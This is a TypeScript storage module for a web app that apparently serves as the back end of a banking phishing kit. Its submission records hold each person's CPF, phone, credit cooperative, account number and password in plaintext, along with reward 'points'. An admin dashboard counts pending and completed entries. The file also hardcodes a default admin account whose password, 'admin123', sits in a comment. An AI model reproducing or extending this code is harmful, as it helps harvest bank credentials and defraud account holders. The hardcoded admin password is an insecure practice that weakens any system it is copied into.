import { 
  User, InsertUser, 
  Submission, InsertSubmission 
} from "@shared/schema";
import session from "express-session";
import createMemoryStore from "memorystore";

const MemoryStore = createMemoryStore(session);

// Storage interface with all CRUD operations
export interface IStorage {
  // Session store
  sessionStore: session.Store;
  
  // User operations
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  // Submission operations
  getAllSubmissions(): Promise<Submission[]>;
  getSubmission(id: number): Promise<Submission | undefined>;
  createSubmission(submission: Partial<InsertSubmission>): Promise<Submission>;
  updateSubmission(id: number, data: Partial<InsertSubmission>): Promise<Submission | undefined>;
  deleteSubmission(id: number): Promise<void>;
  
  // Stats operations
  getStats(): Promise<any>;
  updateStats(submission: Submission): Promise<void>;
}

export class MemStorage implements IStorage {
  sessionStore: session.Store;
  private users: Map<number, User>;
  private submissions: Map<number, Submission>;
  private stats: {
    totalSubmissions: number;
    completedSubmissions: number;
    pendingSubmissions: number;
    failedSubmissions: number;
    totalPoints: number;
    lastUpdated: Date;
  };
  private userId: number;
  private submissionId: number;

  constructor() {
    this.users = new Map();
    this.submissions = new Map();
    this.userId = 1;
    this.submissionId = 1001;
    this.sessionStore = new MemoryStore({
      checkPeriod: 86400000 // 24h in ms
    });
    
    this.stats = {
      totalSubmissions: 0,
      completedSubmissions: 0,
      pendingSubmissions: 0,
      failedSubmissions: 0,
      totalPoints: 0,
      lastUpdated: new Date()
    };
    
    // Create default admin user
    this.users.set(1, {
      id: 1,
      username: "admin",
      password: "2cfbf211da9f0aa5bb6e2e1fef42c573fe88e249b8f49cf85b43bba4d5c78c93.5ac0db85f52b3bc18d82e31439a55b54", // "admin123"
      isAdmin: true
    });
    this.userId = 2; // Increment ID counter after default user
  }

  // User methods
  async getUser(id: number): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username
    );
  }

  async createUser(user: InsertUser): Promise<User> {
    const id = this.userId++;
    const newUser: User = { ...user, id };
    this.users.set(id, newUser);
    return newUser;
  }

  // Submission methods
  async getAllSubmissions(): Promise<Submission[]> {
    return Array.from(this.submissions.values()).sort((a, b) => {
      // Sort by creation date (newest first)
      return new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime();
    });
  }

  async getSubmission(id: number): Promise<Submission | undefined> {
    return this.submissions.get(id);
  }

  async createSubmission(submission: Partial<InsertSubmission>): Promise<Submission> {
    const id = this.submissionId++;
    const now = new Date();
    
    const newSubmission: Submission = {
      id,
      cpf: submission.cpf || "",
      phone: submission.phone || null,
      cooperativa: submission.cooperativa || null,
      account: submission.account || null,
      password: submission.password || null,
      status: submission.status || "pending",
      createdAt: now,
      points: submission.points || 34500
    };
    
    this.submissions.set(id, newSubmission);
    this.stats.totalSubmissions++;
    this.stats.pendingSubmissions++;
    this.stats.lastUpdated = now;
    
    return newSubmission;
  }

  async updateSubmission(id: number, data: Partial<InsertSubmission>): Promise<Submission | undefined> {
    const submission = this.submissions.get(id);
    
    if (!submission) {
      return undefined;
    }
    
    const updatedSubmission = {
      ...submission,
      ...data,
    };
    
    this.submissions.set(id, updatedSubmission);
    return updatedSubmission;
  }

  async deleteSubmission(id: number): Promise<void> {
    const submission = this.submissions.get(id);
    
    if (submission) {
      // Update stats based on the submission status
      if (submission.status === "completed") {
        this.stats.completedSubmissions--;
        this.stats.totalPoints -= submission.points || 0;
      } else if (submission.status === "failed") {
        this.stats.failedSubmissions--;
      } else {
        this.stats.pendingSubmissions--;
      }
      
      this.stats.totalSubmissions--;
      this.stats.lastUpdated = new Date();
      
      this.submissions.delete(id);
    }
  }

  // Stats methods
  async getStats(): Promise<any> {
    // Calculate the most recent stats
    const submissions = Array.from(this.submissions.values());
    
    const recentSubmissions = submissions
      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())
      .slice(0, 5);
    
    // Calculate monthly data for trend chart
    const now = new Date();
    const monthlyData = [];
    
    for (let i = 5; i >= 0; i--) {
      const month = new Date(now.getFullYear(), now.getMonth() - i, 1);
      const monthName = month.toLocaleString('default', { month: 'short' });
      
      const count = submissions.filter(s => {
        const submissionDate = new Date(s.createdAt);
        return submissionDate.getMonth() === month.getMonth() && 
               submissionDate.getFullYear() === month.getFullYear();
      }).length;
      
      monthlyData.push({ month: monthName, count });
    }
    
    return {
      ...this.stats,
      recentSubmissions,
      monthlyData
    };
  }

  async updateStats(submission: Submission): Promise<void> {
    // Update stats based on submission status
    if (submission.status === "completed") {
      this.stats.completedSubmissions++;
      this.stats.pendingSubmissions--;
      this.stats.totalPoints += submission.points || 0;
    } else if (submission.status === "failed") {
      this.stats.failedSubmissions++;
      this.stats.pendingSubmissions--;
    }
    
    this.stats.lastUpdated = new Date();
  }
}

export const storage = new MemStorage();
